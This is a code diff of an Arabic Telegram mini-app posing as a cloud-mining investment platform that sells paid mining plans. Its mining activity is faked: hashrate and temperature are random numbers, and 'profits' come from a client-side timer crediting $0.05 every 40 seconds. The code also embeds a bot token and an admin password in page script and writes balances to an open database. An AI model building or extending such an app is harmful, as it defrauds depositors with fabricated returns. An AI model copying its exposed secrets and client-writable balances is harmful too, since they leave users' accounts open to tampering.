@@ -81,13 +81,13 @@
     </div>
   </div>
 
-  <!-- شريط النشاط -->
+  <!-- شريط النشاط العام -->
   <div class="stats-bar">
     <div>المشتركين النشطين: <span id="totalUsersCount">142</span></div>
     <div>حالة التعدين السحابي: <span>متصل 🟢</span></div>
   </div>
 
-  <!-- شبكة الأرصدة -->
+  <!-- شبكة الأرصدة المحدثة تلقائياً -->
   <div class="stats-grid">
     <div class="stat-card">
       <h4>رصيد العملات الرقمية</h4>
@@ -146,7 +146,7 @@
     </div>
   </div>
 
-  <!-- 2. تبويب التعدين السحابي -->
+  <!-- 2. تبويب التعدين السحابي مع العداد التلقائي المباشر -->
   <div id="miningTab" class="tab-content">
     <div class="card" style="text-align: center; padding: 20px 15px;">
       <i class="fa-solid fa-server" style="font-size: 44px; color: var(--accent); margin-bottom: 12px; filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.4));"></i>
@@ -174,9 +174,11 @@
         </div>
       </div>
 
-      <p style="font-size: 12px; color: var(--text-sub); margin-bottom: 4px;">الأرباح المحتسبة (محاكاة العقد اللحظي):</p>
-      <h2 style="color: var(--accent); margin-bottom: 15px;"><span id="miningProfitDisplay">0.0000</span> USDT</h2>
-      <button class="btn-action" style="background: #1e293b; color: #94a3b8;" onclick="showToast('يتم تجميع الأرباح تلقائياً وإضافتها لرصيدك')">تجميع الأرباح</button>
+      <div style="background: rgba(16, 185, 129, 0.08); border: 1px dashed var(--accent); border-radius: 8px; padding: 12px; margin-bottom: 12px;">
+        <p style="font-size: 12px; color: var(--text-sub); margin-bottom: 4px;">حالة إضافة الأرباح الآلية:</p>
+        <h4 style="color: var(--accent); font-size: 14px;">تُضاف مباشرة للمحفظة بدون جمع يدوي ⚡</h4>
+        <div style="font-size: 11px; color: #38bdf8; margin-top: 4px;">معدل الربح الحالي: +0.05$ (750 ل.س) دورياً</div>
+      </div>
     </div>
   </div>
 
@@ -192,7 +194,7 @@
         <span class="rig-title">Bronze Rig (الباقة الأولى)</span>
         <span class="rig-price">5$</span>
       </div>
-      <div class="rig-details">180 GH/s • ربح يومي 2% • مدعومة بالرصيد الترحيبي التجريبي</div>
+      <div class="rig-details">180 GH/s • ربح دوري تلقائي • مدعومة بالرصيد الترحيبي التجريبي</div>
       <button class="btn-action btn-green" onclick="buyPlan('Bronze Rig', 5)">تفعيل الباقة</button>
     </div>
 
@@ -202,7 +204,7 @@
         <span class="rig-title">Silver Rig (الباقة الثانية)</span>
         <span class="rig-price">15$</span>
       </div>
-      <div class="rig-details">300 GH/s • ربح يومي 2.5% • إيداع حقيقي مطلوب</div>
+      <div class="rig-details">300 GH/s • ربح دوري مضاعف • إيداع حقيقي مطلوب</div>
       <button class="btn-action" onclick="buyPlan('Silver Rig', 15)">ترقية</button>
     </div>
 
@@ -212,7 +214,7 @@
         <span class="rig-title">Gold Rig (الباقة الذهبية)</span>
         <span class="rig-price">50$</span>
       </div>
-      <div class="rig-details">480 GH/s • ربح يومي 3.0% • عائد تعدين فائق</div>
+      <div class="rig-details">480 GH/s • عائد تعدين فائق وتلقائي</div>
       <button class="btn-action" onclick="buyPlan('Gold Rig', 50)">ترقية</button>
     </div>
 
@@ -222,7 +224,7 @@
         <span class="rig-title">Platinum Rig (الماسية)</span>
         <span class="rig-price">100$</span>
       </div>
-      <div class="rig-details">1200 GH/s • ربح يومي 3.5% • مخصصة للمستثمرين</div>
+      <div class="rig-details">1200 GH/s • تعدين سحابي مكثف ومخصص للمستثمرين</div>
       <button class="btn-action" style="background:#7c3aed;" onclick="buyPlan('Platinum Rig', 100)">ترقية</button>
     </div>
 
@@ -232,7 +234,7 @@
         <span class="rig-title">VIP Elite Rig (كبار المستثمرين)</span>
         <span class="rig-price">300$</span>
       </div>
-      <div class="rig-details">3600 GH/s • ربح يومي 4.0% • أقصى كفاءة تعدين</div>
+      <div class="rig-details">3600 GH/s • أقصى كفاءة تعدين مع أعلى أرباح تلقائية</div>
       <button class="btn-action" style="background:#db2777;" onclick="buyPlan('VIP Elite Rig', 300)">ترقية</button>
     </div>
   </div>
@@ -311,13 +313,17 @@
     const BOT_TOKEN = "8778007450:AAGHvf8Nj7duLyzJ_eKGKEhSQzP25_W7THU";
     const ADMIN_CHAT_ID = "5370644839";
     const ADMIN_PASS = "Harbi031187@#$_&";
-    // رابط قاعدة البيانات السحابية الحية للمنصة
     const DB_URL = "https://sham-invest-pro-default-rtdb.firebaseio.com/users";
 
     let currentUserId = "5370644839";
     let currentUserName = "المستخدم";
     let userHandle = "بدون معرف";
     let currentUserUSDT = 0.00;
+    let currentUserSYP = 0;
+    let currentUserPlan = "";
+
+    // سعر صرف الـ 5 سنت مقابل الليرة السورية
+    const SYP_RATE_PER_005 = 750; // كل 0.05$ = 750 ليرة سورية
 
     // استخراج بيانات المشترك الحقيقية من التيليغرام بأمان
     try {
@@ -339,7 +345,19 @@
     document.getElementById('userAvatar').innerText = currentUserName.charAt(0).toUpperCase();
     document.getElementById('adminTargetId').value = currentUserId;
 
-    // مزامنة الرصيد والباقة سحابياً وبشكل دوري كل 3 ثوانٍ
+    function sendTgMessage(chatId, textPlain) {
+      if (!BOT_TOKEN || !chatId) return;
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textPlain)}`;
+        fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
+      } catch (e) {}
+    }
+
+    function sendAdminAlert(textPlain) {
+      sendTgMessage(ADMIN_CHAT_ID, textPlain);
+    }
+
+    // مزامنة البيانات سحابياً
     async function syncUserData() {
       try {
         const res = await fetch(`${DB_URL}/${currentUserId}.json`);
@@ -347,42 +365,69 @@
         
         if (data) {
           currentUserUSDT = parseFloat(data.balance) || 0.00;
+          currentUserPlan = data.activePlan || "";
+          currentUserSYP = Math.floor((currentUserUSDT / 0.05) * SYP_RATE_PER_005);
+          
           document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
-          if (data.activePlan) {
-            document.getElementById('activePlansSummary').innerText = `الباقة المفعّلة: ${data.activePlan} ✓`;
+          document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
+
+          if (currentUserPlan) {
+            document.getElementById('activePlansSummary').innerText = `الباقة المفعّلة: ${currentUserPlan} ✓`;
           }
         } else {
-          // تسجيل أولي للمستخدم الجديد وإعطاؤه 5$ ترحيبية
+          // مستخدم جديد + 5$ هدية
           currentUserUSDT = 5.00;
+          currentUserPlan = "";
+          currentUserSYP = Math.floor((5.00 / 0.05) * SYP_RATE_PER_005);
+
           document.getElementById('balUSDT').innerText = "5.00";
+          document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
+
           await fetch(`${DB_URL}/${currentUserId}.json`, {
             method: 'PUT',
             body: JSON.stringify({ name: currentUserName, balance: 5.00, activePlan: "" })
           });
+
           sendAdminAlert(`🔔 مشترك جديد سجل في المنصة الآن!\n\n👤 الاسم: ${currentUserName}\n🆔 الآيدي: ${currentUserId}\n🔗 المعرف: ${userHandle}\n🎁 الرصيد: 5.00$ تجريبي`);
+
+          const welcomeMsg = `أهلاً وسهلاً بك يا ${currentUserName} في منصة شام إنفست برو (Sham Invest Pro) 🇸🇾✨\n\n` +
+                             `🎁 تم إضافة 5.00$ رصيد ترحيبي تجريبي في حسابك الآن!\n` +
+                             `⚡ يمكنك التوجه إلى قسم (الباقات) وتفعيل باقة Bronze Rig مجاناً لبدء التعدين السحابي ونزول الأرباح تلقائياً في رصيدك.\n\n` +
+                             `نتمنى لك استثماراً ناجحاً! 🚀`;
+          sendTgMessage(currentUserId, welcomeMsg);
         }
       } catch (e) {
-        // احتياط في حال انقطاع النت
         const local = localStorage.getItem("user_usdt_" + currentUserId);
         if (local !== null) {
           currentUserUSDT = parseFloat(local);
+          currentUserSYP = Math.floor((currentUserUSDT / 0.05) * SYP_RATE_PER_005);
           document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
+          document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
         }
       }
     }
 
-    // تشغيل المزامنة فوراً وتكرارها لملاحظة أي شحن لحظياً
     syncUserData();
-    setInterval(syncUserData, 3500);
+    setInterval(syncUserData, 4000);
 
-    // إرسال الإشعار لتيليغرام المشرف
-    function sendAdminAlert(textPlain) {
-      if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
-      try {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(textPlain)}`;
-        fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
-      } catch (e) {}
-    }
+    // العداد التلقائي لنزول أرباح التعدين كل 40 ثانية (أوتوماتيكياً في المحفظة)
+    setInterval(async () => {
+      if (currentUserPlan && currentUserPlan !== "") {
+        const profitStep = 0.05; // نزول 5 سنت
+        currentUserUSDT += profitStep;
+        currentUserSYP = Math.floor((currentUserUSDT / 0.05) * SYP_RATE_PER_005);
+
+        document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
+        document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
+
+        try {
+          await fetch(`${DB_URL}/${currentUserId}.json`, {
+            method: 'PATCH',
+            body: JSON.stringify({ balance: currentUserUSDT })
+          });
+        } catch (err) {}
+      }
+    }, 40000);
 
     function showToast(msg) {
       const t = document.getElementById('toast');
@@ -446,7 +491,11 @@
       }
 
       currentUserUSDT -= price;
+      currentUserPlan = planName;
+      currentUserSYP = Math.floor((currentUserUSDT / 0.05) * SYP_RATE_PER_005);
+
       document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
+      document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
       document.getElementById('activePlansSummary').innerText = `الباقة المفعّلة: ${planName} ✓`;
       showToast(`تم تفعيل ${planName} بنجاح واقتطاع ${price}$ ✓`);
 
@@ -477,7 +526,10 @@
       }
 
       currentUserUSDT -= amount;
+      currentUserSYP = Math.floor((currentUserUSDT / 0.05) * SYP_RATE_PER_005);
+
       document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
+      document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
 
       try {
         await fetch(`${DB_URL}/${currentUserId}.json`, {
@@ -509,7 +561,6 @@
       document.getElementById('adminModal').classList.remove('show');
     }
 
-    // 1. تنفيذ شحن الرصيد السحابي المباشر
     async function executeAdminRecharge() {
       const pass = document.getElementById('adminPassInput').value.trim();
       if (pass !== ADMIN_PASS) return showToast("كلمة المرور غير صحيحة!");
@@ -531,9 +582,12 @@
 
         if (targetId === currentUserId) {
           currentUserUSDT = newBal;
+          currentUserSYP = Math.floor((currentUserUSDT / 0.05) * SYP_RATE_PER_005);
           document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
+          document.getElementById('balSYP').innerText = currentUserSYP.toLocaleString();
         }
 
+        sendTgMessage(targetId, `💰 تم شحن رصيدك بنجاح بمبلغ: ${amount} USDT!\nرصيدك الحالي: ${newBal.toFixed(2)} USDT.`);
         showToast(`تمت إضافة ${amount}$ للحساب ${targetId} سحابياً بنجاح ✓`);
         document.getElementById('adminAmountInput').value = '';
       } catch (err) {
@@ -541,7 +595,6 @@
       }
     }
 
-    // 2. تنفيذ تفعيل الباقة السحابية المباشرة للمستخدم
     async function executeAdminActivatePlan() {
       const pass = document.getElementById('adminPassInput').value.trim();
       if (pass !== ADMIN_PASS) return showToast("كلمة المرور غير صحيحة!");
@@ -558,24 +611,24 @@
         });
 
         if (targetId === currentUserId) {
+          currentUserPlan = selectedPlan;
           document.getElementById('activePlansSummary').innerText = `الباقة المفعّلة: ${selectedPlan} ✓`;
         }
 
+        sendTgMessage(targetId, `⚡ مبروك! قامت الإدارة بتفعيل باقة (${selectedPlan}) لحسابك مباشرة.`);
         showToast(`تم تفعيل ${selectedPlan} للحساب ${targetId} فوراً ✓`);
       } catch (err) {
         showToast("حدث خطأ أثناء الاتصال بالسيرفر!");
       }
     }
 
-    // جهاز التعدين التفاعلي
-    let liveProfit = 0.0000;
+    // حركة مؤشرات التعدين الحية والحرارة
     setInterval(() => {
       const hashEl = document.getElementById("liveHashrate");
       const tempEl = document.getElementById("chipTemp");
       const barEl = document.getElementById("hashBar");
-      const profitEl = document.getElementById("miningProfitDisplay");
 
-      if (hashEl && tempEl && barEl && profitEl) {
+      if (hashEl && tempEl && barEl) {
         const randomHash = (180 + (Math.random() * 5 - 2.5)).toFixed(2);
         hashEl.innerText = randomHash + " GH/s";
 
@@ -583,9 +636,6 @@
         tempEl.innerText = randomTemp + "°C";
 
         barEl.style.width = (65 + Math.random() * 15) + "%";
-
-        liveProfit += 0.0001;
-        profitEl.innerText = liveProfit.toFixed(4);
       }
     }, 2000);
   </script>
